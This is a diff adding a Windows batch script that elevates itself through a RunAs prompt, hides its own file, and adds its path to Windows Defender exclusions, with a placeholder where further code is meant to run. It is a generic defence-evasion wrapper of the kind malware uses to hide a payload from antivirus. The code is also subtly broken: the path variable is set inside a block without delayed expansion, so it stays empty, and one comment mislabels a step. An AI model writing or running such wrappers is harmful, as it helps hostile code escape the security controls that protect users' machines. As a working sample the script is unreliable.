@@ -1,0 +1,27 @@
+@echo off
+
+:: Check if the script is running as administrator
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+:: If the errorlevel is 0, the script is running as administrator
+if %errorlevel% == 0 (
+    :: Get the path to the running batch script
+    set "script_path=%~dpnx0"
+
+    :: Set the "Hidden" attribute for the script
+    attrib +h "%script_path%"
+
+    :: Apply the "Hidden" attribute
+    echo y | cacls "%script_path%" /E /G everyone:R
+
+    :: Add the script to Windows Defender exclusions
+    powershell -command "Add-MpPreference -ExclusionPath '%script_path:\=\\%'"
+
+    echo "Hidden" attribute set and added to Windows Defender exclusions for %script_path%
+
+    :: Your batch script code here
+) else (
+    :: Relaunch the script with elevated privileges
+    powershell -Command "Start-Process -Verb RunAs -FilePath '%~0'"
+    exit
+)
